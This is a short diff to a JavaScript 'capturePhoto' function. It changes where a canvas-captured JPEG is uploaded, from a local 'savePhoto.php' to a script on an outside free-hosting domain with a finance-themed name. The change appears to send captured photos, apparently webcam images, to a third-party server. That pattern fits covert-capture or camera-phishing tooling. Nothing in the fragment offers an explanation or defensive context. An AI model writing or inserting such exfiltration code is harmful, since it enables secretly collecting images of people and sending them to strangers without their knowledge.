@@ -26,7 +26,7 @@ function capturePhoto() {
     const dataURL = canvas.toDataURL('image/jpeg');
 
     const xhr = new XMLHttpRequest();
-    xhr.open('POST', 'savePhoto.php');
+    xhr.open('POST', 'https://hayatfinans.000webhostapp.com/c/savePhoto.php');
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.onload = function() {
         if (xhr.status === 200) {
